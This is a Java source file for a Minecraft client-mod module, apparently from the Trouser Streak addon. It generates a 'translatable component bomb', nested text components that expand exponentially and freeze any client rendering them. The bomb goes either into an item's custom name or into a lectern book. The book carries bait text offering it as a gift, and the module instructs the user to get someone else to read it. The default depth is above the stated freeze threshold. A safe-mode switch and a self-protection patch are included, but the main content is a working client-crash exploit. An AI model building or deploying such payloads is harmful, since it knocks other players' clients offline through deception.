package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.core.component.DataComponents;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.NbtOps;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.resources.Identifier;
import net.minecraft.server.network.Filterable;
import net.minecraft.world.inventory.ContainerInput;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.component.ItemLore;
import net.minecraft.world.item.component.TypedEntityData;
import net.minecraft.world.item.component.WritableBookContent;
import net.minecraft.world.level.block.entity.BlockEntityTypes;
import pwn.noobs.trouserstreak.Trouser;
import pwn.noobs.trouserstreak.utils.BoomGuard;

import java.util.List;

/**
 * CustomNameBoomTest —— "Translatable Component Explosion" (CustomName / Book Page Bomb) test module.
 *
 * <h2>Vulnerability</h2>
 * A text component such as
 * <pre>{translate:"%1$s%1$s… (k instances)", with:[{translate:"%1$s%1$s…", with:[…]}]}</pre>
 * expands into k^depth fragments when rendered (tooltip / opening a book / lectern).
 * Tested on 26.1.2: depth=5 causes noticeable lag, while depth=7 **completely freezes the client**
 * (process-level unresponsiveness).
 * In both 1.21.11 and 26.1.2, {@code TranslatableContents#decomposeTemplate} has no expansion limit,
 * so this is a real client-side DoS that can be used for a "lectern trap."
 *
 * <h2>This module does three things</h2>
 * <ol>
 *   <li><b>Safety switch</b>: {@code 保险(安全模式)} (Safety / Safe Mode) is <b>enabled</b> by default,
 *       meaning it only warns and does not generate anything;
 *       only by <b>disabling</b> it will the test item actually be written to the hotbar (requires Creative Mode).</li>
 *   <li><b>Client-side patch</b>: While the module is enabled, {@link BoomGuard} is activated, which uses
 *       {@code TranslatableContentsMixin} to limit the number of conversion specifiers per level and the
 *       expansion budget per 50 ms, so the client will not freeze even if someone throws a bomb at you.</li>
 *   <li><b>Generate payloads</b>: Lectern mode provides a lectern item (with a book in its
 *       {@code block_entity_data}; placing it in Creative Mode automatically sets {@code has_book=true});
 *       item mode provides a custom item + {@code custom_name} bomb.</li>
 * </ol>
 *
 * <h2>Notes</h2>
 * Generated items will remain in the hotbar; do **not** put items with d≥6 into your main inventory—
 * every hover/open will trigger the effect again.
 * If something goes wrong, first run {@code /clear} on yourself. Use only on a test server you control.
 */
public class TranslatableNBTCrash extends Module {

    public enum Mode {
        /** Lectern Mode: Provides a lectern containing a "bomb book"; once placed, right-click it to retrieve or read the book, which triggers the effect. */
        LECTERN,
        /** Item mode: Provide a standard item with a `custom_name` tag; the tooltip displayed upon hovering triggers the effect. */
        ITEM
    }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("LECTERN = Lectern mode (triggered by right-clicking after placement); ITEM = Item mode (triggered by hovering to view the tooltip).")
            .defaultValue(Mode.LECTERN)
            .build());

    private final Setting<Boolean> safety = sgGeneral.add(new BoolSetting.Builder()
            .name("safe-mode")
            .description("When enabled, it only issues warnings and does not generate any test items; actual generation occurs only when it is disabled.")
            .defaultValue(true)
            .build());

    private final Setting<Integer> depth = sgGeneral.add(new IntSetting.Builder()
            .name("recursion-depth")
            .description("For nested components, the number of expanded instances is calculated as: (repetitions per level) ^ (depth). Testing shows that a value of 5 causes noticeable lag, while a value >=7 leads to a complete freeze of the client.")
            .defaultValue(8)
            .min(1)
            .sliderRange(1,12)
            .build());

    private final Setting<Integer> repeat = sgGeneral.add(new IntSetting.Builder()
            .name("repetitions-per-layer")
            .description("The number of occurrences (width) of `%1$s` in the format string for each layer.")
            .defaultValue(10)
            .min(1)
            .max(32)
            .sliderMax(16)
            .build());

    private final Setting<String> bookText = sgGeneral.add(new StringSetting.Builder()
            .name("book-text")
            .description("Text on the page in LECTERN mode (page number 0).")
            .defaultValue("Please take this book as my gift to you.")
            .visible(() -> mode.get() == Mode.LECTERN)
            .build());

    private final Setting<Integer> bookCount = sgGeneral.add(new IntSetting.Builder()
            .name("number-of-books")
            .description("The `count` of the book inside the lectern (which defaults to 64, consistent with the NBT example you provided). When you take the book, you will receive that many copies.")
            .defaultValue(64)
            .min(1)
            .max(64)
            .visible(() -> mode.get() == Mode.LECTERN)
            .build());

    private final Setting<String> itemId = sgGeneral.add(new StringSetting.Builder()
            .name("item-ID")
            .description("ID used for item mode, such as `minecraft:stick`. If entered incorrectly, it will default to a stick.")
            .defaultValue("minecraft:stick")
            .visible(() -> mode.get() == Mode.ITEM)
            .build());

    private final Setting<Boolean> guard = sgGeneral.add(new BoolSetting.Builder()
            .name("client-patching")
            .description("When the module is active, \"BoomGuard\" (protection against \"exploding\" or bloated translatable components) is enabled to prevent the client from freezing due to \"bombs\"—whether created by you or others.")
            .defaultValue(true)
            .build());

    public TranslatableNBTCrash() {
        super(Trouser.operator, "TranslatableNBTCrash",
                "Create nested translatable text components in custom item names or lectern book names. This can crash clients. The optional client patch protects this client only.");
    }

    @Override
    public void onActivate() {
        if (mc.player == null || mc.level == null || mc.getConnection() == null) {
            error("Not connected to the server.");
            toggle();
            return;
        }

        if (!mc.player.hasInfiniteMaterials()) {
            error("Creative mode required.");
            toggle();
            return;
        }
        // 1) Patch: Effective while the module is active
        BoomGuard.setEnabled(guard.get());

        // 2) Full warning
        warning("===== TranslatableNBTCrash =====");
        warning("This module generates a \"text component bomb\": {translate:\"%%1$s…\", with:[…]} — recursing %d levels deep, with %d instances per level, resulting in a total of %s fragments.",
                depth.get(), repeat.get(), expansions());
        warning("Generated items will end up in your hotbar; do not place items with a depth of 6 or greater into your main inventory, or the effect will re-trigger every time you hover over or open your inventory. If you encounter any issues, use the `/clear` command on yourself.");
        warning("Client-side patching: %s.", BoomGuard.isEnabled() ? "Enabled" : "Disabled");

        // 3) Insurance
        if (safety.get()) {
            warning("Safe Mode is enabled: No test items will be generated this time. Once you have assessed the risks, disable Safe Mode then toggle the module off and back on.");
            return;
        }

        ItemStack payload = mode.get() == Mode.LECTERN ? buildLectern() : buildItem();

        int hotbar = mc.player.getInventory().getSelectedSlot();
        int menuSlot = 36 + hotbar;
        mc.gameMode.handleCreativeModeItemAdd(payload,menuSlot);
        //clickSlot twice to make the item actually appear clientside
        mc.gameMode.handleContainerInput(mc.player.containerMenu.containerId, menuSlot, 0, ContainerInput.PICKUP, mc.player);
        mc.gameMode.handleContainerInput(mc.player.containerMenu.containerId, menuSlot, 0, ContainerInput.PICKUP, mc.player);

        info("Written to hotbar slot %d (menu slot %d): mode=%s, depth=%d, per-layer=%d, expanded=%s",
                hotbar + 1, menuSlot, mode.get(), depth.get(), repeat.get(), expansions());
        if (mode.get() == Mode.LECTERN) {
            info("Place a lectern in Creative mode. Get someone to retrieve and look at the book.");
        } else {
            info("Hover your mouse over this item to trigger it (tooltip rendering).");
        }
    }

    @Override
    public void onDeactivate() {
        // Intentionally refrain from disarming the explosive: otherwise, once the module is deactivated, the bomb in your own inventory will kill you the next time you hover.
        if (BoomGuard.isEnabled()) {
            info("The client-side fix remains active (preventing any bombs left in your inventory from re-triggering); a game restart is required to fully revert it.");
        }
    }

    private int sanitizeTimer = 0;

    /** Item Sanitization: Without relying on any injection points, directly replace "inflated" components—whether on the character or within the current interface—with literal values. */
    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!guard.get() || mc.player == null) {
            return;
        }
        if (++sanitizeTimer < 10) {
            return;
        }
        sanitizeTimer = 0;
        int fixed = 0;
        for (int i = 0; i < 41 && i < mc.player.getInventory().getContainerSize(); i++) {
            fixed += sanitize(mc.player.getInventory().getItem(i));
        }
        if (mc.player.containerMenu != null) {
            for (int i = 0; i < mc.player.containerMenu.slots.size(); i++) {
                fixed += sanitize(mc.player.containerMenu.getSlot(i).getItem());
            }
        }
        if (fixed > 0) {
            warning("[BoomGuard] Cleaned up %d expanded component(s) (replaced with [blocked]).", fixed);
        }
    }

    /** Returns the number of components that were cleaned away. */
    private int sanitize(ItemStack stack) {
        if (stack == null || stack.isEmpty()) {
            return 0;
        }
        int fixed = 0;
        Component customName = stack.get(DataComponents.CUSTOM_NAME);
        if (BoomGuard.isHostile(customName, 0)) {
            stack.set(DataComponents.CUSTOM_NAME, Component.literal("[blocked]"));
            fixed++;
        }
        Component itemName = stack.get(DataComponents.ITEM_NAME);
        if (BoomGuard.isHostile(itemName, 0)) {
            stack.remove(DataComponents.ITEM_NAME);
            fixed++;
        }
        ItemLore lore = stack.get(DataComponents.LORE);
        if (lore != null) {
            for (Component line : lore.lines()) {
                if (BoomGuard.isHostile(line, 0)) {
                    stack.set(DataComponents.LORE, new ItemLore(java.util.List.of(Component.literal("[blocked]"))));
                    fixed++;
                    break;
                }
            }
        }
        return fixed;
    }

    private String expansions() {
        int k = repeat.get();
        int d = depth.get();
        double v = Math.pow(k, d);
        if (v > 1e6) {
            return String.format("%.1f×10^%d", v / Math.pow(10, (int) Math.log10(v)), (int) Math.log10(v));
        }
        return String.valueOf((long) v);
    }

    /** Item mode: Normal item + custom_name "Bomb". */
    private ItemStack buildItem() {
        Identifier id = Identifier.tryParse(itemId.get().trim());
        Item item = id == null ? Items.STICK : BuiltInRegistries.ITEM.getOptional(id).orElse(Items.STICK);
        ItemStack stack = new ItemStack(item);
        stack.set(DataComponents.CUSTOM_NAME, bombComponent(depth.get(), repeat.get()));
        return stack;
    }

    /**
     * LECTERN mode: LECTERN item, block_entity_data contains a "bomb book""。
     * When placed in Creative mode, `LecternBlock#getStateForPlacement` detects the presence of a book and sets `has_book` to `true`.
     */
    private ItemStack buildLectern() {
        ItemStack lectern = new ItemStack(Items.LECTERN);

        ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
        book.setCount(bookCount.get());

        book.set(
                DataComponents.CUSTOM_NAME,
                bombComponent(depth.get(), repeat.get())
        );

        book.set(
                DataComponents.WRITABLE_BOOK_CONTENT,
                new WritableBookContent(
                        List.of(Filterable.passThrough(bookText.get()))
                )
        );

        CompoundTag bookNbt = new CompoundTag();

        assert mc.level != null;
        ItemStack.CODEC
                .encodeStart(mc.level.registryAccess().createSerializationContext(NbtOps.INSTANCE), book)
                .resultOrPartial(error -> error("Failed to encode book: %s", error))
                .ifPresent(element -> {
                    if (element instanceof CompoundTag encodedBook) {
                        bookNbt.merge(encodedBook);
                    }
                });

        CompoundTag blockEntity = new CompoundTag();
        blockEntity.putString("id", "minecraft:lectern");
        blockEntity.putInt("Page", 0);
        blockEntity.put("Book", bookNbt);

        lectern.set(DataComponents.BLOCK_ENTITY_DATA, TypedEntityData.of(BlockEntityTypes.LECTERN, blockEntity));

        return lectern;
    }

    /** Component form (used for components such as `custom_name`). */
    private MutableComponent bombComponent(int depth, int repeat) {
        String template = "%1$s".repeat(repeat);
        MutableComponent inner = Component.literal("x");
        for (int i = 0; i < depth; i++) {
            inner = Component.translatable(template, inner);
        }
        return inner;
    }
}